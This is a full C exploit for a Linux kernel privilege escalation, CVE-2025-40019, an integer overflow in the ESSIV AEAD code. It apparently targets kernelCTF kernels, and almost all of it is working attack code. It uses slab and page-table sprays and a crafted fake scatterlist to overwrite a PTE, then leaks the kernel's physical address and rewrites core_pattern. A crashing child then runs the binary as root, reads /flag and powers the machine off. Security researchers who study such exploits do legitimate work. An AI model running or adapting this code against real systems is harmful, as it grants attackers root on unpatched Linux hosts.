/*
 * CVE-2025-40019: Integer overflow in essiv_aead_crypt (crypto/essiv.c)
 *
 * Exploit chain:
 *   1. essiv_aead_crypt integer overflow: assoclen(0) - ivsize(16) = 0xfffffff0
 *      causes scatterwalk_map_and_copy to write the 16-byte encrypted IV to an
 *      out-of-bounds scatterlist entry.
 *   2. Uninitialized RX SGL: sending exactly authsize (32) bytes makes
 *      outlen = used - as = 0, so af_alg_get_rsgl returns early without
 *      calling sg_init_table — the entire first_rsgl.sgl.sgl[] is uninitialized.
 *   3. Chained SGL residual: a sacrificial authenc recvmsg with 32 iovecs
 *      builds a chained SGL: first_rsgl[0..15] (16 x 1-byte entries) → chain →
 *      second_rsgl → chain → tsgl (anonymous pipe pages from splice).
 *      af_alg_free_resources frees everything; put_page on pipe pages releases
 *      them to the page allocator. Slab slots retain residual chain links.
 *   4. ctl_buf spray: sendmsg on Unix socket with msg_control = 0x208 bytes.
 *      ____sys_sendmsg does sock_kmalloc → copy → sock_kfree_s, reclaiming the
 *      second_rsgl slab slot with a crafted fake SGL entry (length=0xffffffe0).
 *      The chain link to old tsgl (at higher offset) is preserved as residual.
 *   5. PTE spray + trigger: touch mmap'd pages to allocate PTE pages, reclaiming
 *      freed pipe pages. ESSIV recv allocates areq from same slab slot;
 *      scatterwalk_ffwd walks residual chain: 16 x 1 byte → crafted entry
 *      (0xffffffe0) → chain → tsgl entry → freed pipe page (now PTE page).
 *      IV write overwrites a PTE encoding a known physical address.
 *   6. Two-pass exploit: pass 1 leaks _stext physical address via PTE remap;
 *      pass 2 targets core_pattern physical page. Crash child for root.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <pthread.h>
#include <sys/mman.h>
#include <linux/if_alg.h>
#include <errno.h>
#include <err.h>
#include <sched.h>
#include <openssl/evp.h>
#include <openssl/sha.h>

#define SYSCHK(x) ({                          \
    typeof(x) __res = (x);                    \
    if (__res == (typeof(x))-1)               \
        err(1, "SYSCHK(" #x ")");             \
    __res;                                    \
})

/* ------------------------------------------------------------------ */
/* Target-specific kernel symbol offsets (virtual address - STEXT)     */
/* ------------------------------------------------------------------ */

#define STEXT 0xffffffff81000000UL  /* kernel _stext virtual address */

#if defined(LTS)  /* LTS 6.12.48 */
#define CORE_PATTERN    (0xffffffff842107e0UL - STEXT)
#define BRK_BASE        (0xffffffff85600000UL - STEXT)

#elif defined(MIT)  /* mitigation-v4-6.6 */
#define CORE_PATTERN    (0xffffffff83db3720UL - STEXT)
#define BRK_BASE        (0xffffffff84e00000UL - STEXT)

#elif defined(COS)  /* cos-121-18867.199.56 */
#define CORE_PATTERN    (0xffffffff83fb4940UL - STEXT)
#define BRK_BASE        (0xffffffff85200000UL - STEXT)

#else
#error "You must define one of: LTS, MIT, or COS"
#endif

/* Page-aligned base and intra-page offset of core_pattern */
#define CORE_PATTERN_PAGE_OFFSET  (CORE_PATTERN & 0xfff)
#define CORE_PATTERN_PAGE_BASE    (CORE_PATTERN & ~0xfffUL)

/* ------------------------------------------------------------------ */
/* PTE flags for x86-64 page table entries                            */
/* ------------------------------------------------------------------ */

/* Present | RW | User | Accessed | Dirty (first-pass PTE)
 * Points to physical address 0x9c000 (trampoline_pgd), which contains
 * the _brk area virtual address — used to derive _stext physical address.
 * See: https://github.com/google/security-research/blob/ca13fc6d5e7184b13bb82a91dd3a6fa2430fdbd7/pocs/linux/kernelctf/CVE-2023-6560_mitigation/docs/exploit.md#leak-through-write */
#define PTE_FLAGS_FIRST_PASS      0x800000000009c067UL
/* Present | RW | User | Accessed | Dirty | NX (second-pass PTE) */
#define PTE_FLAGS_SECOND_PASS     0x8000000000000867UL

/* ------------------------------------------------------------------ */
/* Exploit layout constants                                           */
/* ------------------------------------------------------------------ */

/* Number of pages sprayed as PTE write targets, spaced 2 MB apart */
#define PTE_SPRAY_COUNT           0x400
/* Spacing between sprayed pages (each in a separate PTE page) */
#define PTE_SPRAY_SPACING         0x200000
/* Base virtual address for the PTE spray region */
#define PTE_SPRAY_BASE            0x200000UL

/* Size of the authenc sendmsg payload */
#define AUTHENC_SENDMSG_LEN       0x20
/* Number of splice calls per pipe. 17 total splices (8+8+1) ensures
 * areq->tsgl_entries is large → tsgl lands in a bigger kmalloc slab. */
#define SPLICE_COUNT_PER_PIPE     0x8
/* Bytes per splice call */
#define SPLICE_CHUNK_SIZE         0x4
/* Pipe fill size (pages of data written to each pipe) */
#define PIPE_FILL_SIZE            0x2000

/* Number of valid iovec entries for the sacrificial recvmsg */
#define RECVMSG_VALID_IOVECS      32
/* Total iovec count passed to recvmsg (rest are zero-initialized) */
#define RECVMSG_TOTAL_IOVECS      0x100

/* Size of the crafted Unix datagram payload for slab reclaim */
#define CRAFT_PAYLOAD_SIZE        0x208
/* Offset within the crafted payload where the fake scatterlist entry is placed.
 * Calculated as 0x10 + 0xf * 0x20 = 0x1f0, aligning with where scatterwalk_ffwd
 * reads after walking past valid entries with the overflowed offset. */
#define FAKE_SGL_ENTRY_OFFSET     (0x10 + 0xf * 0x20)
/* Fake scatterlist length: large unsigned value that causes scatterwalk_ffwd to
 * consume most of the remaining overflowed offset in a single subtraction. */
#define FAKE_SGL_LENGTH           0xffffffe0U

/* Authenc key layout: 8-byte RTA header + 32-byte HMAC key + 16-byte AES key */
#define RTA_HEADER_SIZE           8
#define HMAC_KEY_SIZE             32
#define AES_KEY_SIZE              16
#define TOTAL_KEY_SIZE            (RTA_HEADER_SIZE + HMAC_KEY_SIZE + AES_KEY_SIZE)

/* AES block / IV size */
#define AES_IV_SIZE               16

/* ESSIV sendmsg payload size */
#define ESSIV_SENDMSG_LEN         0x20

/* core_pattern payload written through the remapped PTE */
#define CORE_PATTERN_PAYLOAD      "|/proc/%P/exe %P"

/* ------------------------------------------------------------------ */
/* ESSIV IV pre-computation (userspace OpenSSL)                       */
/* ------------------------------------------------------------------ */

/*
 * Compute ESSIV salt = SHA256(enc_key || auth_key).
 * The kernel's essiv_aead_setkey does the same: it hashes the combined keys
 * to derive the AES-ECB key used for IV encryption.
 */
static int compute_essiv_salt(
    const uint8_t *enc_key, size_t enc_key_len,
    const uint8_t *auth_key, size_t auth_key_len,
    uint8_t *salt_out)
{
    SHA256_CTX sha;
    SHA256_Init(&sha);
    SHA256_Update(&sha, enc_key, enc_key_len);
    SHA256_Update(&sha, auth_key, auth_key_len);
    SHA256_Final(salt_out, &sha);
    return 0;
}

/*
 * Decrypt IV using AES-ECB with the ESSIV salt key.
 * This inverts the kernel's crypto_cipher_encrypt_one(essiv_cipher, iv, iv)
 * so we can choose an IV that produces a desired 16-byte output after
 * ESSIV encryption.
 */
static int essiv_decrypt_iv_ecb(
    const uint8_t *salt_key, size_t salt_len,
    const uint8_t *iv_enc, uint8_t *iv_out)
{
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;

    const EVP_CIPHER *cipher = NULL;
    if (salt_len == 16) cipher = EVP_aes_128_ecb();
    else if (salt_len == 24) cipher = EVP_aes_192_ecb();
    else if (salt_len == 32) cipher = EVP_aes_256_ecb();
    else {
        fprintf(stderr, "Unsupported salt key size: %zu\n", salt_len);
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    EVP_DecryptInit_ex(ctx, cipher, NULL, salt_key, NULL);
    EVP_CIPHER_CTX_set_padding(ctx, 0);

    int outlen = 0, tmplen = 0;
    if (!EVP_DecryptUpdate(ctx, iv_out, &outlen, iv_enc, AES_IV_SIZE)) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    if (!EVP_DecryptFinal_ex(ctx, iv_out + outlen, &tmplen)) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    EVP_CIPHER_CTX_free(ctx);
    return outlen + tmplen;
}

/*
 * Pre-compute the IV that will produce the desired PTE value after ESSIV
 * encryption. The exploit stores the desired output in iv[0..15], and this
 * function replaces it with the corresponding AES-ECB decryption (the
 * inverse of what the kernel will encrypt).
 */
static void compute_iv(uint8_t *iv)
{
    uint8_t auth_key[HMAC_KEY_SIZE];
    uint8_t enc_key[AES_KEY_SIZE];
    for (int i = 0; i < HMAC_KEY_SIZE; i++) auth_key[i] = i;
    for (int i = 0; i < AES_KEY_SIZE; i++) enc_key[i] = i + 0x10;

    uint8_t salt[32];
    compute_essiv_salt(enc_key, sizeof(enc_key), auth_key, sizeof(auth_key), salt);

    uint8_t iv_dec[AES_IV_SIZE];
    int len = essiv_decrypt_iv_ecb(salt, 32, iv, iv_dec);
    if (len <= 0) {
        fprintf(stderr, "Failed to decrypt IV\n");
        exit(1);
    }
    printf("ESSIV decrypted IV: ");
    for (int i = 0; i < len; i++) printf("%02x", iv_dec[i]);
    printf("\n");

    memcpy(iv, iv_dec, AES_IV_SIZE);
}

/* ------------------------------------------------------------------ */
/* Utility                                                            */
/* ------------------------------------------------------------------ */

static void pin_cpu(int cpu)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

/*
 * Build the authenc key blob used by both the sacrificial and ESSIV sockets.
 * Layout: [4-byte RTA len][4-byte AES keylen][32-byte HMAC key][16-byte AES key]
 */
static void build_authenc_key(unsigned char *key)
{
    memset(key, 0, TOTAL_KEY_SIZE);
    /* RTA header: type=1 (CRYPTO_AUTHENC_KEYA_PARAM), len=8 */
    key[0] = 0x08; key[1] = 0x00; key[2] = 0x01; key[3] = 0x00;
    /* AES key length = 16 (AES-128) */
    key[4] = 0x00; key[5] = 0x00; key[6] = 0x00; key[7] = 0x10;
    for (int i = 0; i < HMAC_KEY_SIZE; i++) key[RTA_HEADER_SIZE + i] = i;
    for (int i = 0; i < AES_KEY_SIZE; i++) key[RTA_HEADER_SIZE + HMAC_KEY_SIZE + i] = i + 0x10;
}

/* ------------------------------------------------------------------ */
/* Global state shared between setup/craft/main                       */
/* ------------------------------------------------------------------ */

static char data_buf[0x1000000];  /* general-purpose data buffer */
static int unix_sockfd[2];        /* Unix datagram socketpair for slab reclaim */
static int authenc_opfd;          /* operation fd for the sacrificial authenc socket */

/* ------------------------------------------------------------------ */
/* Step 2a: Create a sacrificial authenc AEAD with pipe-page TX SGL    */
/*          entries. Closing pipes makes alg socket the sole page ref. */
/* ------------------------------------------------------------------ */

/*
 * Create an authenc(hmac(sha512),cbc(aes)) AEAD socket and splice anonymous
 * pipe pages into its TX SGL. When recvmsg is called later (in
 * spray_fake_scatterlist), _aead_recvmsg builds a chained SGL:
 *   first_rsgl[0..15] → chain → second_rsgl[0..N] → chain → tsgl (pipe pages)
 * af_alg_free_resources then frees everything: second_rsgl, put_page on pipe
 * pages (freeing them to page allocator), tsgl, and the areq itself.
 * The slab slots retain residual data including chain links.
 */
static void setup_sacrificial_aead(void)
{
    struct sockaddr_alg sa = {
        .salg_family = AF_ALG,
        .salg_type   = "aead",
        .salg_name   = "authenc(hmac(sha512),cbc(aes))"
    };

    int tfmfd = SYSCHK(socket(AF_ALG, SOCK_SEQPACKET, 0));
    if (bind(tfmfd, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        perror("bind(authenc)");
        exit(1);
    }

    unsigned char key[TOTAL_KEY_SIZE];
    build_authenc_key(key);
    if (setsockopt(tfmfd, SOL_ALG, ALG_SET_KEY, key, sizeof(key)) != 0) {
        perror("setsockopt(ALG_SET_KEY)");
        exit(1);
    }

    /* Fill two pipes with data to be spliced into the AEAD scatterlist */
    int pipe_a[2], pipe_b[2];
    SYSCHK(pipe(pipe_a));
    SYSCHK(pipe(pipe_b));
    write(pipe_a[1], data_buf, PIPE_FILL_SIZE);
    write(pipe_b[1], data_buf, PIPE_FILL_SIZE);

    int opfd = SYSCHK(accept(tfmfd, NULL, 0));

    /* Send initial data with ALG_SET_OP=DECRYPT and ALG_SET_IV via sendmsg */
    unsigned char local_iv[AES_IV_SIZE] = {0};
    struct iovec iov = { data_buf, AUTHENC_SENDMSG_LEN };

    char cbuf[CMSG_SPACE(sizeof(uint32_t)) + CMSG_SPACE(sizeof(struct af_alg_iv) + AES_IV_SIZE)];
    memset(cbuf, 0, sizeof(cbuf));

    struct msghdr msg = {0};
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cbuf;
    msg.msg_controllen = sizeof(cbuf);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type  = ALG_SET_OP;
    cmsg->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t *)CMSG_DATA(cmsg) = ALG_OP_DECRYPT;

    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type  = ALG_SET_IV;
    cmsg->cmsg_len   = CMSG_LEN(sizeof(struct af_alg_iv) + AES_IV_SIZE);
    struct af_alg_iv *ivmsg = (struct af_alg_iv *)CMSG_DATA(cmsg);
    ivmsg->ivlen = AES_IV_SIZE;
    memcpy(ivmsg->iv, local_iv, AES_IV_SIZE);

    ssize_t sent = sendmsg(opfd, &msg, MSG_MORE);
    if (sent < 0) { perror("sendmsg(authenc)"); exit(1); }
    printf("[*] Authenc sendmsg: %zd bytes\n", sent);

    /* Splice anonymous pipe pages into the AEAD socket to create many TX SGL entries.
     * 8 splices from pipe_a + 8 from pipe_b (all with SPLICE_F_MORE) + 1 final.
     * Using 17 splices ensures areq->tsgl_entries is large, placing the tsgl
     * allocation in a bigger kmalloc slab (e.g., kmalloc-1024) that is less
     * likely to be reclaimed by other kernel heap activity before the PTE spray. */
    for (int i = 0; i < SPLICE_COUNT_PER_PIPE; i++)
        SYSCHK(splice(pipe_a[0], 0, opfd, 0, SPLICE_CHUNK_SIZE, SPLICE_F_MORE));
    for (int i = 0; i < SPLICE_COUNT_PER_PIPE; i++)
        SYSCHK(splice(pipe_b[0], 0, opfd, 0, SPLICE_CHUNK_SIZE, SPLICE_F_MORE));
    SYSCHK(splice(pipe_b[0], 0, opfd, 0, 1, 0));  /* final splice without MORE */

    close(pipe_a[0]);
    close(pipe_a[1]);
    close(pipe_b[0]);
    close(pipe_b[1]);

    authenc_opfd = opfd;
}

/* ------------------------------------------------------------------ */
/* Step 2b/2c: recvmsg builds chained SGL then frees it; ctl_buf      */
/*             spray reclaims second_rsgl with crafted fake SGL entry. */
/* ------------------------------------------------------------------ */

/*
 * Phase 2b: recvmsg on the sacrificial authenc socket with 32 iovecs
 * (1 byte each) builds a chained SGL inside the areq:
 *   first_rsgl[0..15] (16 entries, length=1 each)
 *   → sgl[16] chain → second_rsgl (sock_kmalloc'd)
 *   → chain → areq->tsgl (anonymous pipe pages from af_alg_pull_tsgl)
 * After the crypto op, af_alg_free_resources frees second_rsgl, calls
 * put_page on pipe pages (freeing them to page allocator), and frees areq.
 * Slab slots retain residual data including all chain links.
 *
 * Phase 2c: sendmsg on Unix socket with msg_control = 0x208 crafted bytes.
 * ____sys_sendmsg does sock_kmalloc(0x208) → copy → sock_kfree_s, reclaiming
 * the second_rsgl slab slot. The crafted data plants a fake SGL entry with
 * length=0xffffffe0 at FAKE_SGL_ENTRY_OFFSET. The chain link to old tsgl
 * (beyond offset 0x208) is preserved as residual data.
 *
 * Result: areq slab has residual chained SGL:
 *   first_rsgl[0..15] (1-byte each) → chain → second_rsgl (crafted, 0xffffffe0)
 *   → chain → tsgl (freed pipe pages, to be reclaimed as PTE pages)
 *
 * The ESSIV recv allocates its areq from this same slab slot. outlen = 0
 * causes af_alg_get_rsgl to return early (sg_init_table never called), so
 * the entire first_rsgl.sgl.sgl[] is uninitialized — containing this
 * residual chained SGL.
 */
static void spray_fake_scatterlist(void)
{
    /* Allocate two pages, unmap the second to limit how much recvmsg consumes */
    char *pbuf = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANON, -1, 0);
    munmap(pbuf + 0x1000, 0x1000);

    /* Set up iovec: 32 valid 1-byte entries, rest zero-initialized */
    struct iovec iov[RECVMSG_TOTAL_IOVECS] = {0};
    for (int i = 0; i < RECVMSG_VALID_IOVECS; i++) {
        iov[i].iov_base = pbuf;
        iov[i].iov_len = 1;
    }

    struct msghdr msg = {0};
    msg.msg_iov = iov;
    msg.msg_iovlen = RECVMSG_TOTAL_IOVECS;

    /* Phase 2b: recvmsg builds chained SGL (first_rsgl → second_rsgl → tsgl),
     * runs crypto op, then af_alg_free_resources frees everything — put_page
     * on pipe pages frees them to page allocator. Residual chain links remain. */
    recvmsg(authenc_opfd, &msg, 0);

    /* Phase 2c: ctl_buf spray reclaims second_rsgl slab slot with crafted data.
     * ____sys_sendmsg: sock_kmalloc(0x208) → copy → sock_kfree_s.
     * Chain link to old tsgl (beyond 0x208 bytes) is preserved as residual. */
    char *craft = pbuf;
    memset(craft, 0, CRAFT_PAYLOAD_SIZE);
    /* Place a fake struct scatterlist at FAKE_SGL_ENTRY_OFFSET within the
     * second_rsgl slab slot. scatterwalk_ffwd will:
     *   1. Walk first_rsgl[0..15]: 16 × length=1 → consumes 16 from 0xfffffff0
     *   2. Follow chain (sgl[16]) → second_rsgl (this crafted entry)
     *   3. length=0xffffffe0 → consumes remaining 0xffffffe0, len becomes 0
     *   4. sg_next follows preserved chain → tsgl entry (freed pipe page = PTE page)
     *   5. IV write lands on PTE page */
    *(size_t *)&craft[FAKE_SGL_ENTRY_OFFSET]      = 0x4141414140;   /* page_link (placeholder) */
    *(int *)&craft[FAKE_SGL_ENTRY_OFFSET + 0x8]    = 0;              /* offset */
    *(int *)&craft[FAKE_SGL_ENTRY_OFFSET + 0xc]    = FAKE_SGL_LENGTH; /* length */

    printf("[*] Crafted fake SGL at %p\n", craft);
    msg.msg_control = craft;
    msg.msg_controllen = CRAFT_PAYLOAD_SIZE;

    sendmsg(unix_sockfd[1], &msg, 0);
}

/* ------------------------------------------------------------------ */
/* Root payload (executed via core_pattern as root)                    */
/* ------------------------------------------------------------------ */

/*
 * When invoked via core_pattern with a PID argument, steal the crashing
 * process's stdin/stdout/stderr and read the flag.
 */
static void root_payload(const char *pid_str)
{
    int pid = strtoull(pid_str, NULL, 10);
    int pidfd = syscall(SYS_pidfd_open, pid, 0);
    int stdinfd  = syscall(SYS_pidfd_getfd, pidfd, 0, 0);
    int stdoutfd = syscall(SYS_pidfd_getfd, pidfd, 1, 0);
    int stderrfd = syscall(SYS_pidfd_getfd, pidfd, 2, 0);
    dup2(stdinfd, 0);
    dup2(stdoutfd, 1);
    dup2(stderrfd, 2);
    system("cat /flag");
    system("cat /flag");
    system("cat /flag;echo o>/proc/sysrq-trigger");
    exit(0);
}

/* ------------------------------------------------------------------ */
/* Main exploit flow                                                  */
/* ------------------------------------------------------------------ */

int main(int argc, char **argv)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    /* When invoked as root via core_pattern with PID argument */
    if (argc > 1) {
        root_payload(argv[1]);
    }

    /* --- Step 0: Set up IPC and fork for two-pass exploit --- */
    SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, unix_sockfd));

    int phys_addr_pipe[2];
    SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, phys_addr_pipe));
    pin_cpu(0);

    size_t stext_phys = 0;
    if (fork() == 0) {
        /* Child: wait for parent to leak _stext physical address */
        pin_cpu(1);
        read(phys_addr_pipe[0], &stext_phys, sizeof(stext_phys));
        /* Falls through to run pass 2 with stext_phys set */
    }

    /* --- Step 1: Pre-compute IV to encode the desired PTE value --- */
    unsigned char exploit_iv[AES_IV_SIZE];
    if (stext_phys) {
        /* Pass 2 (child): target the core_pattern physical page */
        size_t pa_target = stext_phys + CORE_PATTERN_PAGE_BASE;
        pa_target |= PTE_FLAGS_SECOND_PASS;
        printf("[*] Pass 2: target PA = %zx\n", pa_target);
        *(size_t *)&exploit_iv[0] = pa_target;
        *(size_t *)&exploit_iv[8] = 0;
    } else {
        /* Pass 1 (parent): use a PTE pointing to a known early physical page */
        *(size_t *)&exploit_iv[0] = PTE_FLAGS_FIRST_PASS;
        *(size_t *)&exploit_iv[8] = 0;
    }
    compute_iv(exploit_iv);

    /* --- Step 2a: Create sacrificial authenc AEAD with many SGL entries --- */
    setup_sacrificial_aead();

    /* --- Step 3: Spray user page tables as write targets --- */
    char *addrs[PTE_SPRAY_COUNT];
    char *maddr = (void *)PTE_SPRAY_BASE;
    for (int i = 0; i < PTE_SPRAY_COUNT; i++) {
        addrs[i] = SYSCHK(mmap(maddr + PTE_SPRAY_SPACING * i, 0x1000,
                                PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANON | MAP_FIXED, -1, 0));
    }

    /* --- Set up the vulnerable ESSIV AEAD socket --- */
    struct sockaddr_alg sa = {
        .salg_family = AF_ALG,
        .salg_type   = "aead",
        .salg_name   = "essiv(authenc(hmac(sha256),cbc(aes)),sha256)"
    };

    int tfmfd = SYSCHK(socket(AF_ALG, SOCK_SEQPACKET, 0));
    if (bind(tfmfd, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        perror("bind(essiv)");
        return 1;
    }

    unsigned char key[TOTAL_KEY_SIZE];
    build_authenc_key(key);
    if (setsockopt(tfmfd, SOL_ALG, ALG_SET_KEY, key, sizeof(key)) != 0) {
        perror("setsockopt(ALG_SET_KEY)");
        return 1;
    }

    int opfd = SYSCHK(accept(tfmfd, NULL, 0));

    /* Send 0x20 bytes with ALG_SET_OP=DECRYPT, ALG_SET_AEAD_ASSOCLEN=0.
     * This triggers the integer overflow (0 - ivsize = 0xfffffff0) and also
     * ensures outlen = used - authsize = 0x20 - 0x20 = 0, which causes
     * af_alg_get_rsgl to return early without initializing the RX SGL. */
    char cbuf[CMSG_SPACE(sizeof(__u32)) +
              CMSG_SPACE(sizeof(struct af_alg_iv) + AES_IV_SIZE) +
              CMSG_SPACE(sizeof(__u32))];
    struct msghdr msg = {0};
    struct iovec iov = { data_buf, ESSIV_SENDMSG_LEN };
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cbuf;
    msg.msg_controllen = sizeof(cbuf);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type  = ALG_SET_OP;
    cmsg->cmsg_len   = CMSG_LEN(sizeof(__u32));
    *(__u32 *)CMSG_DATA(cmsg) = ALG_OP_DECRYPT;

    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type  = ALG_SET_AEAD_ASSOCLEN;
    cmsg->cmsg_len   = CMSG_LEN(sizeof(__u32));
    *(__u32 *)CMSG_DATA(cmsg) = 0;  /* assoclen=0, causes integer overflow */

    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type  = ALG_SET_IV;
    cmsg->cmsg_len   = CMSG_LEN(sizeof(struct af_alg_iv) + AES_IV_SIZE);
    struct af_alg_iv *ivmsg = (struct af_alg_iv *)CMSG_DATA(cmsg);
    ivmsg->ivlen = AES_IV_SIZE;
    memcpy(ivmsg->iv, exploit_iv, AES_IV_SIZE);

    int ret = sendmsg(opfd, &msg, 0);
    if (ret < 0) { perror("sendmsg(essiv)"); return 1; }

    int rcvbuf_val = 0;
    SYSCHK(setsockopt(opfd, SOL_SOCKET, SO_RCVBUF, &rcvbuf_val, sizeof(rcvbuf_val)));

    /* --- Step 2b/2c: Free scatterlist and reclaim with crafted entry --- */
    spray_fake_scatterlist();

    /* Touch all sprayed pages to ensure PTEs are populated */
    volatile int sum = 0;
    for (int i = 0; i < PTE_SPRAY_COUNT; i++)
        sum += addrs[i][0];

    /* --- Step 4: Trigger the overflow via recv --- */
    ret = recv(opfd, data_buf, 32, 0);

    /* --- Scan sprayed pages to find which PTE was overwritten --- */
    for (int i = 0; i < PTE_SPRAY_COUNT; i++) {
        if (!stext_phys) {
            /* Pass 1: look for a page whose content changed (PTE was overwritten,
             * page now maps to different physical memory) */
            if (addrs[i][0]) {
                size_t pa_leak = *(size_t *)addrs[i];
                printf("[+] Pass 1: leaked PTE value = %zx\n", pa_leak);
                size_t pa_stext = (pa_leak & ~0xffffUL) - BRK_BASE;
                /* Send _stext physical address to child for pass 2 */
                write(phys_addr_pipe[1], &pa_stext, sizeof(pa_stext));
                break;
            }
        } else {
            /* Pass 2: the page now maps to the core_pattern physical page.
             * Write the core_pattern payload through the remapped PTE. */
            strcpy(addrs[i] + CORE_PATTERN_PAGE_OFFSET, CORE_PATTERN_PAYLOAD);
        }
    }

    /* --- Step 5/6: Trigger privilege escalation via core_pattern --- */
    if (stext_phys) {
        if (fork() == 0) {
            setsid();
            puts("[+] Triggering core_pattern execution...");
            *(volatile size_t *)0 = 0;  /* segfault -> core dump -> root */
        }
    }

    // @sleep(desc="Keep parent/child alive while core_pattern handler runs")
    while (1) sleep(1);

    close(opfd);
    close(tfmfd);
    return 0;
}
